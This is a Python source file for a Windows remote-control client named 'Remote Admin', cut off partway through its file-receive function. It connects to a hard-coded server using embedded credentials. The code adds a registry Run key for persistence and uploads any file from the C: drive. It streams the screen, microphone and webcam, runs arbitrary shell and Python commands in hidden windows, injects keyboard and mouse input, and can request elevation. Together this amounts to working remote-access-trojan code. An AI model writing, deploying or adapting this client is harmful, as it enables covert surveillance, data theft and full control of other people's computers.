import os
import io
import re
import sys
import json
import time
import glob
import ctypes
import shutil
import socket
import tempfile
import subprocess
import threading

if os.name == "nt":
    import winreg

import requests
from PIL import ImageGrab


# ==================================================
# CONFIGURATION
# ==================================================

WEBSITE = "https://downloaders-p4g5.onrender.com"

USERNAME = "xyrielly"
PASSWORD = "BRODONTHACKME1"

# The whole C: drive is available. Folders are scanned lazily,
# one level at a time, as they are opened on the website.
SHARED_FOLDER = "C:\\"

SYNC_INTERVAL = 30
POLL_INTERVAL = 1

MAX_DOWNLOAD_SIZE = 20 * 1024 * 1024
MAX_SCREENSHOT_SIZE = 10 * 1024 * 1024
MAX_STREAM_FRAME_SIZE = 5 * 1024 * 1024

STREAM_INTERVAL = 0.016
STREAM_MAX_SIZE = 1024
STREAM_JPEG_QUALITY = 65

MIC_SAMPLE_RATE = 16000
MIC_BLOCK_SIZE = 1600
MAX_AUDIO_CHUNK_SIZE = 256 * 1024

CAMERA_INTERVAL = 0.7
CAMERA_MAX_SIZE = 1000
CAMERA_JPEG_QUALITY = 70
MAX_CAMERA_FRAME_SIZE = 5 * 1024 * 1024

CONSOLE_TIMEOUT = 120
CONSOLE_OUTPUT_LIMIT = 100000

PYTHON_TIMEOUT = 120
PYTHON_SETUP_TIMEOUT = 840
PYTHON_FTP = "https://www.python.org/ftp/python"

COMPUTER_NAME = socket.gethostname()

# The server assigns this name and appends (1), (2), ... to duplicates.
identity = {
    "assigned": None,
    "name": COMPUTER_NAME
}

registered_event = threading.Event()

session = requests.Session()
session.auth = (USERNAME, PASSWORD)

stop_event = threading.Event()
shared_folder = None

console_lock = threading.Lock()
console_cwd = None

stream_lock = threading.Lock()
stream_thread = None
stream_stop_event = threading.Event()

mic_lock = threading.Lock()
mic_thread = None
mic_stop_event = threading.Event()

camera_lock = threading.Lock()
camera_thread = None
camera_stop_event = threading.Event()

STARTUP_NAME = "Remote Admin"
STARTUP_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"


# ==================================================
# STARTUP REGISTRATION (VISIBLE IN TASK MANAGER)
# ==================================================

def get_startup_command():

    if getattr(sys, "frozen", False):
        return '"' + os.path.abspath(sys.executable) + '"'

    return (
        '"' + sys.executable + '" '
        '"' + os.path.abspath(__file__) + '"'
    )


def ensure_startup_entry():

    if os.name != "nt":
        return

    try:

        command = get_startup_command()

        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            STARTUP_KEY,
            0,
            winreg.KEY_SET_VALUE
        ) as key:

            winreg.SetValueEx(
                key,
                STARTUP_NAME,
                0,
                winreg.REG_SZ,
                command
            )

        print("[STARTUP] Registered:", command, flush=True)

    except Exception as error:

        print("[STARTUP] Could not register:", error, flush=True)


# ==================================================
# DIRECTORY SCANNER (ONE LEVEL AT A TIME)
# ==================================================

def build_directory_tree(folder, relative_path=""):

    result = {
        "name": os.path.basename(folder) or folder,
        "path": relative_path,
        "loaded": True,
        "dirs": [],
        "files": []
    }

    try:

        entries = sorted(
            os.scandir(folder),
            key=lambda item: (
                not item.is_dir(follow_symlinks=False),
                item.name.lower()
            )
        )

    except (PermissionError, OSError):
        return result

    for entry in entries:

        try:

            if entry.is_symlink():
                continue

            child_relative = (
                os.path.join(relative_path, entry.name)
                if relative_path
                else entry.name
            ).replace("\\", "/")

            if entry.is_dir(follow_symlinks=False):

                result["dirs"].append({
                    "name": entry.name,
                    "path": child_relative,
                    "loaded": False,
                    "dirs": [],
                    "files": []
                })

            elif entry.is_file(follow_symlinks=False):

                size = entry.stat(
                    follow_symlinks=False
                ).st_size

                result["files"].append({
                    "name": entry.name,
                    "path": child_relative,
                    "size": size,
                    "extension": os.path.splitext(entry.name)[1]
                })

        except (PermissionError, OSError):
            continue

    return result


# ==================================================
# PATH RESOLUTION
# ==================================================

def get_directory_path(relative_path):

    relative_path = (relative_path or "").replace("\\", "/").strip()

    if not relative_path:
        return os.path.realpath(shared_folder)

    if os.path.isabs(relative_path):

        candidate = os.path.realpath(relative_path)

    else:

        parts = [
            part for part in relative_path.split("/")
            if part and part != "."
        ]

        candidate = os.path.realpath(
            os.path.join(shared_folder, *parts)
        )

    if not os.path.isdir(candidate):
        raise FileNotFoundError("Directory does not exist.")

    return candidate


def get_safe_file_path(relative_path):

    relative_path = (relative_path or "").replace("\\", "/").strip()

    if not relative_path:
        raise ValueError("Invalid file path.")

    if os.path.isabs(relative_path):

        candidate = os.path.realpath(relative_path)

    else:

        parts = [
            part for part in relative_path.split("/")
            if part and part != "."
        ]

        candidate = os.path.realpath(
            os.path.join(shared_folder, *parts)
        )

    if not os.path.isfile(candidate):
        raise FileNotFoundError("File does not exist.")

    return candidate


# ==================================================
# ELEVATION (ADMINISTRATOR)
# ==================================================

def is_admin():

    if os.name != "nt":
        return False

    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def relaunch_elevated():

    # ShellExecuteW with "runas" shows the normal UAC prompt on the
    # target screen; nothing is elevated until someone approves it.
    if getattr(sys, "frozen", False):
        target = os.path.abspath(sys.executable)
        parameters = ""
    else:
        target = sys.executable
        parameters = '"' + os.path.abspath(__file__) + '"'

    result = ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        target,
        parameters,
        None,
        0
    )

    return int(result) > 32


def handle_elevate(command_id):

    if is_admin():
        upload_console_result(
            command_id,
            "This client is already running as administrator.",
            0
        )
        return

    try:
        started = relaunch_elevated()
    except Exception as error:
        upload_console_result(
            command_id,
            "Elevation failed: " + str(error),
            1
        )
        return

    if not started:
        upload_console_result(
            command_id,
            "The UAC prompt was declined or could not be shown. "
            "The client is still running without administrator rights.",
            1
        )
        return

    upload_console_result(
        command_id,
        "A UAC prompt is now showing on the target computer.\n"
        "If it is approved, an administrator copy of the client starts "
        "and this one exits. The computer may briefly appear offline "
        "and reconnect with an Administrator badge.",
        0
    )

    stop_event.set()
    stream_stop_event.set()
    mic_stop_event.set()
    camera_stop_event.set()


# ==================================================
# DIRECTORY SYNC
# ==================================================

def sync_directory():

    try:

        tree = build_directory_tree(shared_folder)

        payload = {
            "computer_name": COMPUTER_NAME,
            "root": shared_folder,
            "tree": tree,
            "admin": is_admin()
        }

        if identity["assigned"]:
            payload["name"] = identity["assigned"]

        response = session.post(
            WEBSITE + "/sync",
            json=payload,
            timeout=60
        )

        response.raise_for_status()

        data = response.json()

        identity["assigned"] = data.get("name") or COMPUTER_NAME
        identity["name"] = identity["assigned"]

        registered_event.set()

        print(
            "[SYNC] Directory updated as:",
            identity["name"],
            flush=True
        )

    except Exception as error:

        print("[SYNC] Failed:", error, flush=True)


def sync_loop():

    while not stop_event.is_set():

        sync_directory()

        stop_event.wait(SYNC_INTERVAL)


# ==================================================
# LAZY DIRECTORY LISTING
# ==================================================

def handle_list_dir(action):

    request_id = action.get("request_id")
    relative_path = action.get("path") or ""

    if not request_id:
        return

    try:

        folder = get_directory_path(relative_path)
        listing = build_directory_tree(folder, relative_path)

        payload = {
            "request_id": request_id,
            "name": identity["name"],
            "path": relative_path,
            "listing": json.dumps(listing)
        }

    except Exception as error:

        payload = {
            "request_id": request_id,
            "name": identity["name"],
            "path": relative_path,
            "error": str(error)
        }

    try:

        response = session.post(
            WEBSITE + "/upload-list",
            data=payload,
            timeout=60
        )

        response.raise_for_status()

        print(
            "[LIST] Sent listing for:",
            relative_path or ".",
            flush=True
        )

    except Exception as error:

        print("[LIST] Upload failed:", error, flush=True)


# ==================================================
# SCREENSHOT CAPTURE
# ==================================================

def capture_screenshot(request_id):

    try:

        print(
            "[SCREENSHOT] Capture requested.",
            flush=True
        )

        screenshot = ImageGrab.grab()

        image_data = io.BytesIO()

        screenshot.save(
            image_data,
            format="PNG"
        )

        image_data.seek(0)

        if image_data.getbuffer().nbytes > MAX_SCREENSHOT_SIZE:
            raise ValueError("Screenshot exceeds the size limit.")

        response = session.post(
            WEBSITE + "/upload-screenshot",

            data={
                "request_id": request_id,
                "name": identity["name"]
            },

            files={
                "screenshot": (
                    "screenshot.png",
                    image_data,
                    "image/png"
                )
            },

            timeout=60
        )

        response.raise_for_status()

        print(
            "[SCREENSHOT] Upload completed.",
            flush=True
        )

    except Exception as error:

        print(
            "[SCREENSHOT] Failed:",
            error,
            flush=True
        )


# ==================================================
# LIVE SCREEN SHARE
# ==================================================

def capture_stream_frame():

    screenshot = ImageGrab.grab()

    screenshot.thumbnail(
        (STREAM_MAX_SIZE, STREAM_MAX_SIZE)
    )

    image_data = io.BytesIO()

    screenshot.save(
        image_data,
        format="JPEG",
        quality=STREAM_JPEG_QUALITY
    )

    image_data.seek(0)

    return image_data


def stream_worker():

    print("[STREAM] Sharing started.", flush=True)

    try:

        while not stop_event.is_set() and not stream_stop_event.is_set():

            try:

                frame = capture_stream_frame()

                if frame.getbuffer().nbytes > MAX_STREAM_FRAME_SIZE:
                    raise ValueError("Frame exceeds the size limit.")

                response = session.post(
                    WEBSITE + "/upload-stream",

                    data={"name": identity["name"]},

                    files={
                        "frame": (
                            "frame.jpg",
                            frame,
                            "image/jpeg"
                        )
                    },

                    timeout=20
                )

                response.raise_for_status()

            except Exception as error:

                print(
                    "[STREAM] Frame failed:",
                    error,
                    flush=True
                )

            stream_stop_event.wait(STREAM_INTERVAL)

    finally:

        print("[STREAM] Sharing stopped.", flush=True)


def start_stream():

    global stream_thread

    with stream_lock:

        stream_stop_event.clear()

        if stream_thread and stream_thread.is_alive():
            return

        stream_thread = threading.Thread(
            target=stream_worker,
            daemon=True
        )

        stream_thread.start()


def stop_stream():

    stream_stop_event.set()


# ==================================================
# REMOTE MOUSE
# ==================================================

MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004

mouse_lock = threading.Lock()
dpi_ready = False


def ensure_dpi_awareness():

    global dpi_ready

    if dpi_ready or os.name != "nt":
        return

    try:

        ctypes.windll.user32.SetProcessDpiAwarenessContext(
            ctypes.c_void_p(-4)
        )

    except Exception:

        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(2)

        except Exception:

            try:
                ctypes.windll.user32.SetProcessDPIAware()

            except Exception:
                pass

    dpi_ready = True


def handle_mouse_click(action):

    if os.name != "nt":
        return

    try:

        x = min(max(float(action.get("x", 0.0)), 0.0), 1.0)
        y = min(max(float(action.get("y", 0.0)), 0.0), 1.0)

    except (TypeError, ValueError):

        return

    with mouse_lock:

        try:

            ensure_dpi_awareness()

            user32 = ctypes.windll.user32

            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)

            if width <= 1 or height <= 1:
                return

            target_x = int(round(x * (width - 1)))
            target_y = int(round(y * (height - 1)))

            user32.SetCursorPos(target_x, target_y)

            user32.mouse_event(
                MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0
            )

            time.sleep(0.02)

            user32.mouse_event(
                MOUSEEVENTF_LEFTUP, 0, 0, 0, 0
            )

            print(
                "[MOUSE] Click at",
                target_x,
                target_y,
                flush=True
            )

        except Exception as error:

            print("[MOUSE] Click failed:", error, flush=True)


# ==================================================
# REMOTE MOUSE BUTTONS / SCROLL / KEYBOARD
# ==================================================

MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_WHEEL = 0x0800

VK_MAP = {
    "Backspace": 0x08, "Tab": 0x09, "Enter": 0x0D, "Shift": 0x10,
    "Control": 0x11, "Alt": 0x12, "CapsLock": 0x14, "Escape": 0x1B,
    " ": 0x20, "ArrowLeft": 0x25, "ArrowUp": 0x26,
    "ArrowRight": 0x27, "ArrowDown": 0x28, "Delete": 0x2E,
    "Meta": 0x5B, "F1": 0x70, "F2": 0x71, "F3": 0x72, "F4": 0x73,
    "F5": 0x74, "F6": 0x75, "F7": 0x76, "F8": 0x77, "F9": 0x78,
    "F10": 0x79, "F11": 0x7A, "F12": 0x7B,
}


def _mouse_xy(action):
    try:
        x = min(max(float(action.get("x", 0.5)), 0.0), 1.0)
        y = min(max(float(action.get("y", 0.5)), 0.0), 1.0)
    except (TypeError, ValueError):
        return None, None
    ensure_dpi_awareness()
    user32 = ctypes.windll.user32
    w = user32.GetSystemMetrics(0)
    h = user32.GetSystemMetrics(1)
    if w <= 1 or h <= 1:
        return None, None
    return int(round(x * (w - 1))), int(round(y * (h - 1)))


def handle_mouse_button(action):
    if os.name != "nt":
        return
    try:
        tx, ty = _mouse_xy(action)
        if tx is None:
            return
        with mouse_lock:
            user32 = ctypes.windll.user32
            user32.SetCursorPos(tx, ty)
            if action["action"] == "mouse_down":
                user32.mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
            else:
                user32.mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
    except Exception as error:
        print("[MOUSE] Button failed:", error, flush=True)


def handle_mouse_scroll(action):
    if os.name != "nt":
        return
    try:
        tx, ty = _mouse_xy(action)
        if tx is None:
            return
        delta = int(action.get("delta", 3)) * 120
        with mouse_lock:
            user32 = ctypes.windll.user32
            user32.SetCursorPos(tx, ty)
            user32.mouse_event(MOUSEEVENTF_WHEEL, 0, 0, delta, 0)
    except Exception as error:
        print("[SCROLL] Failed:", error, flush=True)


def _vk_for_key(key):
    if key in VK_MAP:
        return VK_MAP[key]
    if len(key) == 1:
        ch = key.upper()
        if "A" <= ch <= "Z" or "0" <= ch <= "9":
            return ord(ch)
        vk = ctypes.windll.user32.VkKeyScanW(ord(key)) & 0xFF
        if vk != 0xFF:
            return vk
    return None


def handle_key_press(action):
    if os.name != "nt":
        return
    try:
        key = action.get("key", "")
        key_type = action.get("type", "press")
        vk = _vk_for_key(key)
        if vk is None:
            return
        user32 = ctypes.windll.user32
        KEYEVENTF_KEYUP = 0x0002
        if key_type == "down":
            user32.keybd_event(vk, 0, 0, 0)
        elif key_type == "up":
            user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
        else:
            user32.keybd_event(vk, 0, 0, 0)
            time.sleep(0.02)
            user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
    except Exception as error:
        print("[KEY] Press failed:", error, flush=True)


def handle_key_text(action):
    if os.name != "nt":
        return
    try:
        text = action.get("text", "")
        user32 = ctypes.windll.user32
        KEYEVENTF_UNICODE = 0x0004
        KEYEVENTF_KEYUP = 0x0002
        for ch in text:
            code = ord(ch)
            user32.keybd_event(0, code, KEYEVENTF_UNICODE, 0)
            user32.keybd_event(0, code, KEYEVENTF_UNICODE | KEYEVENTF_KEYUP, 0)
    except Exception as error:
        print("[KEY] Text failed:", error, flush=True)


# ==================================================
# LIVE MICROPHONE
# ==================================================

def upload_mic_error(message):

    try:

        response = session.post(
            WEBSITE + "/upload-audio",

            data={
                "name": identity["name"],
                "error": message[:500]
            },

            timeout=20
        )

        response.raise_for_status()

    except Exception as error:

        print("[MIC] Could not report error:", error, flush=True)


def mic_worker():

    print("[MIC] Listening started.", flush=True)

    stream = None

    try:

        try:
            import sounddevice as sd
        except Exception as error:

            upload_mic_error(
                "Microphone support is not available: " + str(error)
            )

            return

        try:

            stream = sd.RawInputStream(
                samplerate=MIC_SAMPLE_RATE,
                channels=1,
                dtype="int16",
                blocksize=MIC_BLOCK_SIZE
            )

            stream.start()

        except Exception as error:

            upload_mic_error(
                "Could not open the microphone: " + str(error)
            )

            return

        while not stop_event.is_set() and not mic_stop_event.is_set():

            try:

                data, overflowed = stream.read(MIC_BLOCK_SIZE)
                chunk = bytes(data)

            except Exception as error:

                upload_mic_error(
                    "Microphone read failed: " + str(error)
                )

                break

            if not chunk:
                continue

            if len(chunk) > MAX_AUDIO_CHUNK_SIZE:
                continue

            try:

                response = session.post(
                    WEBSITE + "/upload-audio",

                    data={"name": identity["name"]},

                    files={
                        "audio": (
                            "chunk.pcm",
                            chunk,
                            "application/octet-stream"
                        )
                    },

                    timeout=20
                )

                response.raise_for_status()

            except Exception as error:

                print(
                    "[MIC] Chunk upload failed:",
                    error,
                    flush=True
                )

    finally:

        if stream is not None:

            try:
                stream.stop()
                stream.close()

            except Exception:
                pass

        print("[MIC] Listening stopped.", flush=True)


def start_mic():

    global mic_thread

    with mic_lock:

        mic_stop_event.clear()

        if mic_thread and mic_thread.is_alive():
            return

        mic_thread = threading.Thread(
            target=mic_worker,
            daemon=True
        )

        mic_thread.start()


def stop_mic():

    mic_stop_event.set()


# ==================================================
# LIVE CAMERA
# ==================================================

def upload_camera_error(message):

    try:

        response = session.post(
            WEBSITE + "/upload-camera",

            data={
                "name": identity["name"],
                "error": message[:500]
            },

            timeout=20
        )

        response.raise_for_status()

    except Exception as error:

        print("[CAMERA] Could not report error:", error, flush=True)


def camera_worker():

    print("[CAMERA] Camera started.", flush=True)

    capture = None

    try:

        try:
            import cv2
        except Exception as error:

            upload_camera_error(
                "Camera support is not available: " + str(error)
            )

            return

        try:

            capture = cv2.VideoCapture(0, cv2.CAP_DSHOW)

            if not capture.isOpened():

                capture.release()
                capture = cv2.VideoCapture(0)

            if not capture.isOpened():

                upload_camera_error("Could not open the camera.")
                return

        except Exception as error:

            upload_camera_error(
                "Could not open the camera: " + str(error)
            )

            return

        while not stop_event.is_set() and not camera_stop_event.is_set():

            try:

                ok, frame = capture.read()

            except Exception as error:

                upload_camera_error(
                    "Camera read failed: " + str(error)
                )

                break

            if not ok or frame is None:

                upload_camera_error("Camera frame capture failed.")
                break

            height, width = frame.shape[:2]
            longest = max(height, width)

            if longest > CAMERA_MAX_SIZE:

                scale = CAMERA_MAX_SIZE / longest

                frame = cv2.resize(
                    frame,
                    (int(width * scale), int(height * scale))
                )

            ok, encoded = cv2.imencode(
                ".jpg",
                frame,
                [int(cv2.IMWRITE_JPEG_QUALITY), CAMERA_JPEG_QUALITY]
            )

            if not ok:
                continue

            jpeg = encoded.tobytes()

            if len(jpeg) > MAX_CAMERA_FRAME_SIZE:

                upload_camera_error("Camera frame is too large.")
                break

            try:

                response = session.post(
                    WEBSITE + "/upload-camera",

                    data={"name": identity["name"]},

                    files={
                        "frame": (
                            "frame.jpg",
                            jpeg,
                            "image/jpeg"
                        )
                    },

                    timeout=20
                )

                response.raise_for_status()

            except Exception as error:

                print(
                    "[CAMERA] Frame upload failed:",
                    error,
                    flush=True
                )

            camera_stop_event.wait(CAMERA_INTERVAL)

    finally:

        if capture is not None:

            try:
                capture.release()

            except Exception:
                pass

        print("[CAMERA] Camera stopped.", flush=True)


def start_camera():

    global camera_thread

    with camera_lock:

        camera_stop_event.clear()

        if camera_thread and camera_thread.is_alive():
            return

        camera_thread = threading.Thread(
            target=camera_worker,
            daemon=True
        )

        camera_thread.start()


def stop_camera():

    camera_stop_event.set()


# ==================================================
# REMOTE CONSOLE
# ==================================================

def decode_console_bytes(raw):

    if not raw:
        return ""

    try:
        return raw.decode("utf-8")

    except UnicodeDecodeError:
        return raw.decode("cp437", errors="replace")


def truncate_console_output(text):

    if len(text) <= CONSOLE_OUTPUT_LIMIT:
        return text

    half = CONSOLE_OUTPUT_LIMIT // 2

    return (
        text[:half]
        + "\n... [output truncated] ...\n"
        + text[-half:]
    )


def upload_console_result(command_id, output_text, exit_code):

    try:

        response = session.post(
            WEBSITE + "/upload-console",

            data={
                "command_id": command_id,
                "name": identity["name"],
                "output": truncate_console_output(output_text),
                "exit_code": exit_code
            },

            timeout=60
        )

        response.raise_for_status()

    except Exception as error:

        print(
            "[CONSOLE] Upload failed:",
            error,
            flush=True
        )


def execute_console_command(command_id, command):

    global console_cwd

    with console_lock:
        cwd = console_cwd

    if not os.path.isdir(cwd):
        cwd = shared_folder

        with console_lock:
            console_cwd = shared_folder

    output_text = ""
    exit_code = 0

    try:

        stripped = command.strip()
        lowered = stripped.lower()

        if lowered == "cd" or lowered.startswith("cd "):

            target = stripped[2:].strip()

            if target.lower().startswith("/d "):
                target = target[3:].strip()

            if len(target) >= 2 and target[0] == '"' and target[-1] == '"':
                target = target[1:-1]

            if not target:

                output_text = cwd

            else:

                candidate = (
                    target if os.path.isabs(target)
                    else os.path.join(cwd, target)
                )

                candidate = os.path.abspath(candidate)

                if os.path.isdir(candidate):

                    with console_lock:
                        console_cwd = candidate

                    output_text = candidate

                else:

                    exit_code = 1
                    output_text = (
                        "The system cannot find the path specified: "
                        + candidate
                    )

        else:

            creationflags = 0

            if os.name == "nt":
                creationflags = getattr(
                    subprocess, "CREATE_NO_WINDOW", 0
                )

            process = subprocess.run(
                stripped,
                shell=True,
                cwd=cwd,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=CONSOLE_TIMEOUT,
                creationflags=creationflags
            )

            exit_code = process.returncode
            output_text = decode_console_bytes(process.stdout)

    except subprocess.TimeoutExpired:

        exit_code = -1
        output_text = (
            "Command timed out after "
            + str(CONSOLE_TIMEOUT)
            + " seconds."
        )

    except Exception as error:

        exit_code = -1
        output_text = "Command failed: " + str(error)

    upload_console_result(command_id, output_text, exit_code)


# ==================================================
# REMOTE PYTHON RUNNER
# ==================================================

def no_window_flags():

    if os.name == "nt":
        return getattr(subprocess, "CREATE_NO_WINDOW", 0)

    return 0


def python_env():

    env = os.environ.copy()

    # The frozen client sets variables that break a separate interpreter.
    for key in (
        "PYTHONHOME",
        "PYTHONPATH",
        "_MEIPASS2",
        "PYTHONEXECUTABLE"
    ):
        env.pop(key, None)

    return env


def python_version(interpreter):

    if not interpreter:
        return ""

    try:

        process = subprocess.run(
            [interpreter, "--version"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=30,
            creationflags=no_window_flags(),
            env=python_env()
        )

    except Exception:
        return ""

    if process.returncode != 0:
        return ""

    text = decode_console_bytes(process.stdout).strip()

    if not text.lower().startswith("python 3"):
        return ""

    return text.splitlines()[0]


def find_python():

    if not getattr(sys, "frozen", False):
        return sys.executable

    candidates = []

    for name in ("python.exe", "python3.exe"):
        path = shutil.which(name)

        if path:
            candidates.append(path)

    patterns = []

    local_app_data = os.environ.get("LOCALAPPDATA")

    if local_app_data:
        patterns.append(
            os.path.join(
                local_app_data,
                "Programs",
                "Python",
                "Python3*",
                "python.exe"
            )
        )

    for base in ("ProgramFiles", "ProgramFiles(x86)"):

        folder = os.environ.get(base)

        if folder:
            patterns.append(
                os.path.join(folder, "Python3*", "python.exe")
            )

    patterns.append(os.path.join("C:\\", "Python3*", "python.exe"))

    for pattern in patterns:

        try:
            matches = glob.glob(pattern)

        except Exception:
            continue

        for path in sorted(matches, reverse=True):
            candidates.append(path)

    launcher = shutil.which("py.exe") or shutil.which("py")

    if launcher:

        try:

            process = subprocess.run(
                [
                    launcher,
                    "-3",
                    "-c",
                    "import sys; print(sys.executable)"
                ],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                timeout=30,
                creationflags=no_window_flags(),
                env=python_env()
            )

            path = process.stdout.decode("utf-8", "replace").strip()

            if path:
                candidates.append(path)

        except Exception:
            pass

    seen = set()

    for candidate in candidates:

        try:
            key = os.path.normcase(os.path.abspath(candidate))

        except Exception:
            continue

        if key in seen:
            continue

        seen.add(key)

        # The Windows Store alias is a stub, not a real interpreter.
        if "windowsapps" in candidate.lower():
            continue

        if not os.path.isfile(candidate):
            continue

        if python_version(candidate):
            return candidate

    return None


def latest_python_installers(limit=6):

    response = requests.get(PYTHON_FTP + "/", timeout=60)

    response.raise_for_status()

    versions = set()

    for match in re.findall(
        r'href="(3\.(\d+)\.(\d+))/"',
        response.text
    ):

        version = match[0]
        minor = int(match[1])

        if minor < 8:
            continue

        versions.add(version)

    def version_key(value):
        return tuple(int(part) for part in value.split("."))

    urls = []

    for version in sorted(
        versions,
        key=version_key,
        reverse=True
    )[:limit]:

        urls.append(
            PYTHON_FTP
            + "/"
            + version
            + "/python-"
            + version
            + "-amd64.exe"
        )

        urls.append(
            PYTHON_FTP
            + "/"
            + version
            + "/python-"
            + version
            + "-win32.exe"
        )

    return urls


def get_python_interpreter():

    if not getattr(sys, "frozen", False):
        return sys.executable

    interpreter = find_python()

    if not interpreter:
        raise RuntimeError(
            "Python 3 is not installed on this computer. "
            "Run 'python-setup' in the remote console to install it."
        )

    return interpreter


def handle_python_setup(command_id):

    lines = []
    exit_code = 0
    installer_path = None

    def say(text):
        lines.append(text)
        print("[PYTHON-SETUP]", text, flush=True)

    try:

        say("Checking the target computer for Python 3...")

        interpreter = find_python()

        if interpreter:

            say("Python is already installed.")
            say("Path: " + interpreter)
            say("Version: " + python_version(interpreter))

        else:

            say("Python was not found. Starting installation...")

            urls = latest_python_installers()

            if not urls:
                raise RuntimeError(
                    "Could not find a Python installer on python.org."
                )

            for url in urls:

                say("Trying " + url)

                try:

                    response = requests.get(
                        url,
                        stream=True,
                        timeout=(30, 300)
                    )

                    try:

                        response.raise_for_status()

                        with tempfile.NamedTemporaryFile(
                            suffix=".exe",
                            prefix="python-setup-",
                            delete=False
                        ) as target:

                            installer_path = target.name
                            size = 0

                            for chunk in response.iter_content(
                                1024 * 256
                            ):

                                if not chunk:
                                    continue

                                target.write(chunk)
                                size += len(chunk)

                    finally:
                        response.close()

                    say(
                        "Downloaded {:.1f} MB.".format(
                            size / (1024 * 1024)
                        )
                    )

                    break

                except Exception as error:

                    say("Download failed: " + str(error))

                    if (
                        installer_path
                        and os.path.exists(installer_path)
                    ):

                        try:
                            os.unlink(installer_path)

                        except OSError:
                            pass

                    installer_path = None

            if not installer_path:
                raise RuntimeError(
                    "Every Python installer download failed."
                )

            say("Running the silent installer...")

            process = subprocess.run(
                [
                    installer_path,
                    "/quiet",
                    "InstallAllUsers=0",
                    "PrependPath=1",
                    "Include_launcher=1",
                    "InstallLauncherAllUsers=0",
                    "Include_pip=1",
                    "Include_test=0"
                ],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=PYTHON_SETUP_TIMEOUT,
                creationflags=no_window_flags()
            )

            installer_output = decode_console_bytes(
                process.stdout
            ).strip()

            if installer_output:
                say(installer_output)

            for _ in range(10):

                interpreter = find_python()

                if interpreter:
                    break

                time.sleep(3)

            if interpreter:

                say("Python installed successfully.")
                say("Path: " + interpreter)
                say("Version: " + python_version(interpreter))
                say("The Python runner will use it automatically.")

            else:

                exit_code = 1
                say(
                    "The installer finished, but Python 3 was still "
                    "not found."
                )

    except subprocess.TimeoutExpired:

        exit_code = 1
        say(
            "The Python installer timed out after "
            + str(PYTHON_SETUP_TIMEOUT)
            + " seconds."
        )

    except Exception as error:

        exit_code = 1
        say("Python setup failed: " + str(error))

    finally:

        if installer_path and os.path.exists(installer_path):

            try:
                os.unlink(installer_path)

            except OSError:
                pass

    upload_console_result(command_id, "\n".join(lines), exit_code)


def upload_python_result(request_id, output_text, exit_code):

    try:

        response = session.post(
            WEBSITE + "/upload-python",

            data={
                "request_id": request_id,
                "name": identity["name"],
                "output": truncate_console_output(output_text),
                "exit_code": exit_code
            },

            timeout=60
        )

        response.raise_for_status()

    except Exception as error:

        print(
            "[PYTHON] Upload failed:",
            error,
            flush=True
        )


def execute_python_code(request_id, code):

    output_text = ""
    exit_code = 0
    script_path = None

    try:

        with console_lock:
            cwd = console_cwd

        if not cwd or not os.path.isdir(cwd):
            cwd = shared_folder

        with tempfile.NamedTemporaryFile(
            mode="w",
            suffix=".py",
            prefix="remote_",
            encoding="utf-8",
            newline="\n",
            delete=False
        ) as script:

            script.write(code)
            script_path = script.name

        creationflags = 0

        if os.name == "nt":
            creationflags = getattr(
                subprocess, "CREATE_NO_WINDOW", 0
            )

        process = subprocess.run(
            [get_python_interpreter(), "-u", script_path],
            cwd=cwd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=PYTHON_TIMEOUT,
            creationflags=creationflags,
            env=python_env()
        )

        exit_code = process.returncode
        output_text = decode_console_bytes(process.stdout)

    except subprocess.TimeoutExpired:

        exit_code = -1
        output_text = (
            "Python code timed out after "
            + str(PYTHON_TIMEOUT)
            + " seconds."
        )

    except Exception as error:

        exit_code = -1
        output_text = "Python failed: " + str(error)

    finally:

        if script_path and os.path.exists(script_path):

            try:
                os.unlink(script_path)

            except OSError:
                pass

    upload_python_result(request_id, output_text, exit_code)


# ==================================================
# FILE DOWNLOAD
# ==================================================

def handle_download(action):

    try:

        download_id = action.get("download_id")
        relative_path = action.get("path")

        if not download_id or not relative_path:
            return

        file_path = get_safe_file_path(relative_path)

        file_size = os.path.getsize(file_path)

        if file_size > MAX_DOWNLOAD_SIZE:
            print(
                "[DOWNLOAD] File exceeds 20 MB:",
                relative_path,
                flush=True
            )
            return

        filename = os.path.basename(file_path)

        print(
            "[DOWNLOAD] Sending:",
            filename,
            flush=True
        )

        with open(file_path, "rb") as file:

            response = session.post(
                WEBSITE + "/upload-download",

                data={
                    "download_id": download_id,
                    "name": identity["name"]
                },

                files={
                    "file": (
                        filename,
                        file,
                        "application/octet-stream"
                    )
                },

                timeout=120
            )

        response.raise_for_status()

        print(
            "[DOWNLOAD] Upload completed.",
            flush=True
        )

    except Exception as error:

        print(
            "[DOWNLOAD] Failed:",
            error,
            flush=True
        )


# ==================================================
# FILE RECEIVE (DASHBOARD DOWNLOADER)
# ==================================================

def upload_relative_path(raw):

    text = str(raw or "").replace("\\", "/")

    parts = []

    for part in text.split("/"):

        if part in ("", "."):
            continue

        if part == ".." or ":" in part:
            return None

        parts.append(part)

    return "/".join(parts) or None


def remote_admin_folder():

    base = (
        os.environ.get("LOCALAPPDATA")
        or os.path.expanduser("~")
    )

    return os.path.join(base, "RemoteAdmin")


def handle_receive_files(action):

    transfer_id = action.get("transfer_id")
    items = action.get("files") or []

    if not transfer_id or not items:
        return

    target_root = remote_admin_folder()

    saved = 0
    errors = []

    print(
        "[RECEIVE] Incoming transfer:",
